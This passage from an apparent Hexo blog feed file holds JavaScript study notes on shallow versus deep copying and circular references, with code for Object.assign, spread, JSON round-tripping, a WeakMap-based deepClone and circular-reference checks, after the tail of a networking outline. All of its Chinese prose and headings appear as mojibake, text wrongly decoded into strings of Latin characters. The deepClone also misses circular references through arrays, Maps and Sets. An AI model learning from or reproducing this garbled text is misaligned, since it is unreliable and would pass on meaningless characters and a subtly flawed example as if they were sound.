title="äº”ã€é«˜çº§ç½‘ç»œæŠ€æœ¯"></a>äº”ã€é«˜çº§ç½‘ç»œæŠ€æœ¯</h1><h2 id="5-1-APIè®¾è®¡è§„èŒƒ"><a href="#5-1-APIè®¾è®¡è§„èŒƒ" class="headerlink" title="5.1 APIè®¾è®¡è§„èŒƒ"></a>5.1 APIè®¾è®¡è§„èŒƒ</h2><h3 id="RESTfulæ¶æ„åŸåˆ™ï¼ˆèµ„æºåŒ–-çŠ¶æ€è½¬ç§»ï¼‰"><a href="#RESTfulæ¶æ„åŸåˆ™ï¼ˆèµ„æºåŒ–-çŠ¶æ€è½¬ç§»ï¼‰" class="headerlink" title="RESTfulæ¶æ„åŸåˆ™ï¼ˆèµ„æºåŒ–&#x2F;çŠ¶æ€è½¬ç§»ï¼‰"></a>RESTfulæ¶æ„åŸåˆ™ï¼ˆèµ„æºåŒ–&#x2F;çŠ¶æ€è½¬ç§»ï¼‰</h3><h3 id="GraphQLæŸ¥è¯¢ä¸RESTå¯¹æ¯”"><a href="#GraphQLæŸ¥è¯¢ä¸RESTå¯¹æ¯”" class="headerlink" title="GraphQLæŸ¥è¯¢ä¸RESTå¯¹æ¯”"></a>GraphQLæŸ¥è¯¢ä¸RESTå¯¹æ¯”</h3><h2 id="5-2-è°ƒè¯•ä¸ç›‘æ§"><a href="#5-2-è°ƒè¯•ä¸ç›‘æ§" class="headerlink" title="5.2 è°ƒè¯•ä¸ç›‘æ§"></a>5.2 è°ƒè¯•ä¸ç›‘æ§</h2><h3 id="æµè§ˆå™¨Networké¢æ¿åˆ†æï¼ˆWaterfall-Timingï¼‰"><a href="#æµè§ˆå™¨Networké¢æ¿åˆ†æï¼ˆWaterfall-Timingï¼‰" class="headerlink" title="æµè§ˆå™¨Networké¢æ¿åˆ†æï¼ˆWaterfall&#x2F;Timingï¼‰"></a>æµè§ˆå™¨Networké¢æ¿åˆ†æï¼ˆWaterfall&#x2F;Timingï¼‰</h3><h3 id="æ€§èƒ½æŒ‡æ ‡ï¼ˆTTFB-LCP-FCPï¼‰ç›‘æ§"><a href="#æ€§èƒ½æŒ‡æ ‡ï¼ˆTTFB-LCP-FCPï¼‰ç›‘æ§" class="headerlink" title="æ€§èƒ½æŒ‡æ ‡ï¼ˆTTFB&#x2F;LCP&#x2F;FCPï¼‰ç›‘æ§"></a>æ€§èƒ½æŒ‡æ ‡ï¼ˆTTFB&#x2F;LCP&#x2F;FCPï¼‰ç›‘æ§</h3><h2 id="5-3-æ–°å…´æŠ€æœ¯"><a href="#5-3-æ–°å…´æŠ€æœ¯" class="headerlink" title="5.3 æ–°å…´æŠ€æœ¯"></a>5.3 æ–°å…´æŠ€æœ¯</h2><h3 id="WebRTCåŸºç¡€ï¼ˆP2Pé€šä¿¡-ä¿¡ä»¤æœåŠ¡ï¼‰"><a href="#WebRTCåŸºç¡€ï¼ˆP2Pé€šä¿¡-ä¿¡ä»¤æœåŠ¡ï¼‰" class="headerlink" title="WebRTCåŸºç¡€ï¼ˆP2Pé€šä¿¡&#x2F;ä¿¡ä»¤æœåŠ¡ï¼‰"></a>WebRTCåŸºç¡€ï¼ˆP2Pé€šä¿¡&#x2F;ä¿¡ä»¤æœåŠ¡ï¼‰</h3><h3 id="WebTransportåè®®æ¢ç´¢"><a href="#WebTransportåè®®æ¢ç´¢" class="headerlink" title="WebTransportåè®®æ¢ç´¢"></a>WebTransportåè®®æ¢ç´¢</h3>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaScript ä¸“é¢˜çŸ¥è¯†å­¦ä¹ </title>
    <link href="/2025/06/19/JavaScript%20Study%20Notes/"/>
    <url>/2025/06/19/JavaScript%20Study%20Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="æ·±æ‹·è´ä¸æµ…æ‹·è´"><a href="#æ·±æ‹·è´ä¸æµ…æ‹·è´" class="headerlink" title="æ·±æ‹·è´ä¸æµ…æ‹·è´"></a>æ·±æ‹·è´ä¸æµ…æ‹·è´</h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p><strong>æµ…æ‹·è´ï¼ˆshallow copyï¼‰</strong></p><p>æµ…æ‹·è´åªå¤åˆ¶å¯¹è±¡çš„ç¬¬ä¸€å±‚å±æ€§ï¼Œå¦‚æœå±æ€§ç±»å‹æ˜¯åŸºæœ¬ç±»å‹ï¼Œåˆ™å¤åˆ¶å…¶å€¼ï¼Œå¦‚æœå±æ€§ç±»å‹æ˜¯å¼•ç”¨ç±»å‹ï¼Œåˆ™å¤åˆ¶å…¶åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼ˆå³å¼•ç”¨ï¼‰ï¼Œå› æ­¤æ‹·è´åçš„å¯¹è±¡ä¸åŸå¯¹è±¡å…±äº«å¼•ç”¨ç±»å‹çš„å±æ€§</p><p><strong>æ·±æ‹·è´ï¼ˆdeep copyï¼‰</strong></p><p>æ·±æ‹·è´ä¼šé€’å½’å¤åˆ¶å¯¹è±¡çš„æ‰€æœ‰å±‚çº§ï¼Œåˆ›å»ºä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡ï¼Œæ–°å¯¹è±¡ä¸åŸå¯¹è±¡ä¸å…±äº«ä»»ä½•å¼•ç”¨ç±»å‹çš„å±æ€§</p><span id="more"></span><h2 id="æµ…æ‹·è´çš„å®ç°æ–¹å¼"><a href="#æµ…æ‹·è´çš„å®ç°æ–¹å¼" class="headerlink" title="æµ…æ‹·è´çš„å®ç°æ–¹å¼"></a>æµ…æ‹·è´çš„å®ç°æ–¹å¼</h2><p><strong>Object.assign()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: &#123; <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> &#125; &#125;;<br><span class="hljs-keyword">const</span> shallowCopy = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">assign</span>(&#123;&#125;, obj);<br></code></pre></td></tr></table></figure><p><strong>å±•å¼€è¿ç®—ç¬¦</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: &#123; <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> &#125; &#125;;<br><span class="hljs-keyword">const</span> shallowCopy = &#123; ...obj &#125;;<br></code></pre></td></tr></table></figure><p><strong>Array.prototype.slice()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]];<br><span class="hljs-keyword">const</span> shallowCopy = arr.<span class="hljs-title function_">slice</span>();<br></code></pre></td></tr></table></figure><p><strong>Array.prototype.concat()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]];<br><span class="hljs-keyword">const</span> shallowCopy = arr.<span class="hljs-title function_">concat</span>();<br></code></pre></td></tr></table></figure><h2 id="æ·±æ‹·è´çš„å®ç°æ–¹å¼"><a href="#æ·±æ‹·è´çš„å®ç°æ–¹å¼" class="headerlink" title="æ·±æ‹·è´çš„å®ç°æ–¹å¼"></a>æ·±æ‹·è´çš„å®ç°æ–¹å¼</h2><p><strong>JSON.parse(JSON.stringify())</strong></p><p>æœ€ç®€å•ä½†æœ‰é™åˆ¶çš„æ·±æ‹·è´æ–¹æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123; <span class="hljs-attr">a</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">b</span>: &#123; <span class="hljs-attr">c</span>: <span class="hljs-number">2</span> &#125; &#125;;<br><span class="hljs-keyword">const</span> deepCopy = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br></code></pre></td></tr></table></figure><p>å±€é™æ€§ï¼š</p><ul><li>ä¸èƒ½å¤„ç†å‡½æ•°ã€Symbolã€undefinedï¼Œä¼šè¢«å®Œå…¨åˆ é™¤</li><li>ä¸èƒ½å¤„ç†å¾ªç¯å¼•ç”¨</li><li>ä¼šä¸¢å¤± Date å¯¹è±¡çš„ç±»å‹ï¼ˆè½¬ä¸º ISO æ ¼å¼å­—ç¬¦ä¸²ï¼‰</li><li>ä¼šä¸¢å¤± RegExp å¯¹è±¡çš„ç±»å‹ï¼ˆè½¬ä¸ºç©ºå¯¹è±¡ï¼‰</li><li>ä¼šä¸¢å¤± Map&#x2F;Set ç­‰ç‰¹æ®Šå¯¹è±¡ï¼ˆè½¬ä¸ºç©ºå¯¹è±¡ï¼‰</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p><ul><li>null æ˜¯ Json è§„èŒƒä¸­çš„åˆæ³•å€¼ï¼Œå› æ­¤ Json.parse(Json.stringify())æ˜¯å¯ä»¥æ­£ç¡®å¤„ç† null çš„</li><li>NaN å’Œ Infinity ä¼šè¢«è½¬ä¸º nullï¼Œå› ä¸ºå®ƒä»¬åœ¨ JavaScript å±äº Number ç±»å‹ï¼ŒJson è§„èŒƒä¸­æ²¡æœ‰ NaN å’Œ Infinity è¿™ç§å€¼ï¼Œåºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè½¬ä¸º null</li></ul><p><strong>é€’å½’å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepClone</span>(<span class="hljs-params">obj, hash = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakMap</span>()</span>) &#123;<br>  <span class="hljs-keyword">if</span> (obj === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> obj;<br>  &#125;<br>  <br>  <span class="hljs-comment">// å¤„ç†å¾ªç¯å¼•ç”¨</span><br>  <span class="hljs-keyword">if</span> (hash.<span class="hljs-title function_">has</span>(obj)) &#123;<br>    <span class="hljs-keyword">return</span> hash.<span class="hljs-title function_">get</span>(obj);<br>  &#125;<br>  <br>  <span class="hljs-keyword">let</span> clone;<br>  <br>  <span class="hljs-comment">// å¤„ç†ç‰¹æ®Šå¯¹è±¡ç±»å‹</span><br>  <span class="hljs-keyword">switch</span> (<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj)) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Date]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(obj.<span class="hljs-title function_">getTime</span>());<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object RegExp]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RegExp</span>(obj);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Map]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(obj, <span class="hljs-function">(<span class="hljs-params">[key, val]</span>) =&gt;</span> [key, <span class="hljs-title function_">deepClone</span>(val, hash)]));<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Set]&#x27;</span>:<br>      clone = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(obj, <span class="hljs-function"><span class="hljs-params">val</span> =&gt;</span> <span class="hljs-title function_">deepClone</span>(val, hash)));<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[object Array]&#x27;</span>:<br>      clone = obj.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">deepClone</span>(item, hash));<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-comment">// å¤„ç†æ™®é€šå¯¹è±¡</span><br>      clone = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(obj));<br>      hash.<span class="hljs-title function_">set</span>(obj, clone);<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-keyword">if</span> (obj.<span class="hljs-title function_">hasOwnProperty</span>(key)) &#123;<br>          clone[key] = <span class="hljs-title function_">deepClone</span>(obj[key], hash);<br>        &#125;<br>      &#125;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> clone;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç¬¬ä¸‰æ–¹å·¥å…·åº“</strong></p><ul><li>Lodash çš„ <code>_.cloneDeep()</code></li><li>jQuery çš„ <code>$.extend(true, &#123;&#125;, obj)</code></li></ul><h2 id="æ€§èƒ½è€ƒè™‘"><a href="#æ€§èƒ½è€ƒè™‘" class="headerlink" title="æ€§èƒ½è€ƒè™‘"></a>æ€§èƒ½è€ƒè™‘</h2><p>æ·±æ‹·è´æ¯”æµ…æ‹·è´æ›´æ¶ˆè€—æ€§èƒ½ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤§å‹å¯¹è±¡æˆ–æ·±å±‚åµŒå¥—ç»“æ„æ—¶ï¼Œå®é™…åº”ç”¨ä¸­åº”ç»“åˆéœ€æ±‚é€‰æ‹©åˆé€‚çš„æ‹·è´æ–¹å¼</p><h2 id="åº”ç”¨åœºæ™¯"><a href="#åº”ç”¨åœºæ™¯" class="headerlink" title="åº”ç”¨åœºæ™¯"></a>åº”ç”¨åœºæ™¯</h2><p><strong>é€‚åˆæµ…æ‹·è´çš„åœºæ™¯</strong></p><ul><li>æ˜ç¡®çŸ¥é“åªéœ€è¦æ‹·è´ç¬¬ä¸€å±‚å±æ€§</li><li>éœ€è¦å¿«é€Ÿæ‹·è´è€Œä¸å…³å¿ƒåµŒå¥—å¯¹è±¡çš„å¼•ç”¨å…³ç³»</li><li>å¯¹è±¡å±æ€§éƒ½æ˜¯åŸºæœ¬ç±»å‹</li></ul><p><strong>é€‚åˆæ·±æ‹·è´çš„åœºæ™¯</strong></p><ul><li>éœ€è¦å®Œå…¨ç‹¬ç«‹çš„å¯¹è±¡å‰¯æœ¬</li><li>éœ€è¦ä¿®æ”¹åµŒå¥—å¯¹è±¡ä½†åˆä¸èƒ½å½±å“åŸå¯¹è±¡</li><li>å¤„ç†ä¸å¯å˜æ•°æ®ï¼ˆå¦‚ Redux çš„ state æ›´æ–°ï¼‰</li></ul><h2 id="é¢è¯•å¸¸è§é—®é¢˜"><a href="#é¢è¯•å¸¸è§é—®é¢˜" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h2><p><strong>Qï¼šå¦‚ä½•åˆ¤æ–­ä¸€ä¸ªæ‹·è´æ˜¯æ·±æ‹·è´è¿˜æ˜¯æµ…æ‹·è´ï¼Ÿ</strong></p><p>å¯ä»¥é€šè¿‡ä¿®æ”¹æ‹·è´å¯¹è±¡çš„æŸä¸ªå¼•ç”¨ç±»å‹å±æ€§ï¼ŒæŸ¥çœ‹åŸå¯¹è±¡çš„å±æ€§æ˜¯å¦è¢«å½±å“æ¥åˆ¤æ–­</p><p><strong>Qï¼šå¦‚ä½•å®ç°ä¸€ä¸ªæ”¯æŒå¾ªç¯å¼•ç”¨çš„æ·±æ‹·è´ï¼Ÿ</strong></p><p>ä½¿ç”¨ WeakMap æ¥å­˜å‚¨å·²æ‹·è´çš„å¯¹è±¡ï¼Œé‡åˆ°ç›¸åŒçš„å¼•ç”¨æ—¶ç›´æ¥è¿”å›å­˜å‚¨çš„å€¼</p><p><strong>Qï¼šä¸ºä»€ä¹ˆJson.parse(Json.stringify())ä¸èƒ½å¤„ç†å‡½æ•°ï¼Ÿ</strong></p><p>å› ä¸º Json æ ¼å¼ä¸æ”¯æŒå‡½æ•°ï¼Œåœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å‡½æ•°ä¼šè¢«å¿½ç•¥</p><p><strong>Qï¼šæ·±æ‹·è´å’Œæµ…æ‹·è´åœ¨æ€§èƒ½ä¸Šæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</strong></p><p>æ·±æ‹·è´éœ€è¦é€’å½’éå†æ‰€æœ‰å±æ€§ï¼Œæ€§èƒ½å¼€é”€å¤§ï¼Œç‰¹åˆ«æ˜¯å¯¹äºå¤§å‹å¯¹è±¡æˆ–æ·±å±‚åµŒå¥—ç»“æ„</p><p><strong>Qï¼šå¦‚ä½•å®ç°ä¸€ä¸ªæ”¯æŒç‰¹æ®Šå¯¹è±¡ï¼ˆå¦‚ Dateã€RegExpï¼‰çš„æ·±æ‹·è´ï¼Ÿ</strong></p><p>éœ€è¦åœ¨æ‹·è´æ—¶åˆ¤æ–­å¯¹è±¡ç±»å‹ï¼Œæ ¹æ®ä¸åŒç±»å‹åšç‰¹æ®Šå¤„ç†</p><h1 id="å¾ªç¯å¼•ç”¨"><a href="#å¾ªç¯å¼•ç”¨" class="headerlink" title="å¾ªç¯å¼•ç”¨"></a>å¾ªç¯å¼•ç”¨</h1><h2 id="å¾ªç¯å¼•ç”¨çš„å®šä¹‰"><a href="#å¾ªç¯å¼•ç”¨çš„å®šä¹‰" class="headerlink" title="å¾ªç¯å¼•ç”¨çš„å®šä¹‰"></a>å¾ªç¯å¼•ç”¨çš„å®šä¹‰</h2><p>å¾ªç¯å¼•ç”¨æ˜¯æŒ‡å¯¹è±¡ä¹‹é—´ç›¸äº’å¼•ç”¨ï¼Œå½¢æˆé—­ç¯çš„æƒ…å†µï¼Œç®€å•æ¥è¯´å°±æ˜¯å¯¹è±¡ A å¼•ç”¨äº†å¯¹è±¡ Bï¼Œå¯¹è±¡ B åˆç›´æ¥æˆ–é—´æ¥çš„å¼•ç”¨äº†å¯¹è±¡ A</p><h2 id="å¾ªç¯å¼•ç”¨çš„ç¤ºä¾‹"><a href="#å¾ªç¯å¼•ç”¨çš„ç¤ºä¾‹" class="headerlink" title="å¾ªç¯å¼•ç”¨çš„ç¤ºä¾‹"></a>å¾ªç¯å¼•ç”¨çš„ç¤ºä¾‹</h2><p><strong>ç®€å•å¾ªç¯å¼•ç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> objA = &#123;&#125;;<br><span class="hljs-keyword">const</span> objB = &#123; <span class="hljs-attr">a</span>: objA &#125;;<br>objA.<span class="hljs-property">b</span> = objB; <span class="hljs-comment">// å½¢æˆå¾ªç¯å¼•ç”¨</span><br></code></pre></td></tr></table></figure><p><strong>è‡ªå¼•ç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">self</span> = obj; <span class="hljs-comment">// å¯¹è±¡å¼•ç”¨è‡ªèº«</span><br></code></pre></td></tr></table></figure><p><strong>å¤æ‚å¾ªç¯å¼•ç”¨</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> parent = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Parent&quot;</span> &#125;;<br><span class="hljs-keyword">const</span> child = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Child&quot;</span>, <span class="hljs-attr">parent</span>: parent &#125;;<br>parent.<span class="hljs-property">child</span> = child; <span class="hljs-comment">// å½¢æˆå¾ªç¯å¼•ç”¨</span><br></code></pre></td></tr></table></figure><h2 id="å¾ªç¯å¼•ç”¨å¸¦æ¥çš„é—®é¢˜"><a href="#å¾ªç¯å¼•ç”¨å¸¦æ¥çš„é—®é¢˜" class="headerlink" title="å¾ªç¯å¼•ç”¨å¸¦æ¥çš„é—®é¢˜"></a>å¾ªç¯å¼•ç”¨å¸¦æ¥çš„é—®é¢˜</h2><p><strong>Json åºåˆ—åŒ–é—®é¢˜</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">self</span> = obj;<br><span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj); <span class="hljs-comment">// æŠ›å‡ºé”™è¯¯: TypeError: Converting circular structure to JSON</span><br></code></pre></td></tr></table></figure><p><strong>æ·±æ‹·è´é—®é¢˜</strong></p><p>æ™®é€šçš„æ·±æ‹·è´æ–¹æ³•ï¼ˆå¦‚é€’å½’æ‹·è´ï¼‰å¦‚æœæ²¡æœ‰ç‰¹æ®Šå¤„ç†å¾ªç¯å¼•ç”¨ï¼Œä¼šå¯¼è‡´æ— é™é€’å½’</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">naiveDeepClone</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">const</span> clone = &#123;&#125;;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj[key] === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>      clone[key] = <span class="hljs-title function_">naiveDeepClone</span>(obj[key]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      clone[key] = obj[key];<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> clone;<br>&#125;<br><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">self</span> = obj;<br><span class="hljs-title function_">naiveDeepClone</span>(obj); <span class="hljs-comment">// æ ˆæº¢å‡º: Maximum call stack size exceeded</span><br></code></pre></td></tr></table></figure><p><strong>å†…å­˜æ³„éœ²é—®é¢˜</strong></p><p>åœ¨è€ç‰ˆæœ¬ IE æµè§ˆå™¨ä¸­ï¼Œå¾ªç¯å¼•ç”¨å¯èƒ½å¯¼è‡´å†…å­˜æ— æ³•è¢«åƒåœ¾å›æ”¶æœºåˆ¶æ­£ç¡®é‡Šæ”¾</p><h2 id="å¦‚ä½•æ£€æµ‹å¾ªç¯å¼•ç”¨"><a href="#å¦‚ä½•æ£€æµ‹å¾ªç¯å¼•ç”¨" class="headerlink" title="å¦‚ä½•æ£€æµ‹å¾ªç¯å¼•ç”¨"></a>å¦‚ä½•æ£€æµ‹å¾ªç¯å¼•ç”¨</h2><p><strong>ä½¿ç”¨ Json.stringify()</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hasCircularReference</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>    <span class="hljs-keyword">return</span> e.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;circular&#x27;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä½¿ç”¨ WeakMap&#x2F;WeakSet</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">hasCircular</span>(<span class="hljs-params">obj, seen = <span class="hljs-keyword">new</span> <span class="hljs-built_in">WeakSet</span>()</span>) &#123;<br>  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj !== <span class="hljs-string">&#x27;object&#x27;</span> || obj === <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  <br>  <span class="hljs-keyword">if</span> (seen.<span class="hljs-title function_">has</span>(obj)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  seen.<span class="hljs-title function_">add</span>(obj);<br>  <br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> obj) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">hasCircular</span>(obj[key], seen)) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="é¢è¯•å¸¸è§é—®é¢˜-1"><a href="#é¢è¯•å¸¸è§é—®é¢˜-1" class="headerlink" title="é¢è¯•å¸¸è§é—®é¢˜"></a>é¢è¯•å¸¸è§é—®é¢˜</h2><p><strong>Qï¼šä»€ä¹ˆæ˜¯å¾ªç¯å¼•ç”¨ï¼Ÿ</strong></p><p>å¾ªç¯å¼•ç”¨æ˜¯æŒ‡å¯¹è±¡ä¹‹é—´ç›¸äº’å¼•ç”¨å½¢æˆçš„é—­ç¯ï¼Œä¾‹å¦‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> a = &#123;&#125;; <br><span class="hljs-keyword">const</span> b = &#123; <span class="hljs-attr">ref</span>: a &#125;; <br>a.<span class="hljs-property">ref</span> = b; <span class="hljs-comment">// a å¼•ç”¨ bï¼Œb åˆå¼•ç”¨ a</span><br></code></pre></td></tr></table></figure><p><strong>Qï¼šå¾ªç¯å¼•ç”¨ä¼šå¸¦æ¥å“ªäº›é—®é¢˜ï¼Ÿ</strong></p><ol><li>Json.stringify ä¼šæŠ›å‡ºå¼‚å¸¸</li><li>ç®€å•çš„æ·±æ‹·è´ä¼šå¯¼è‡´æ— 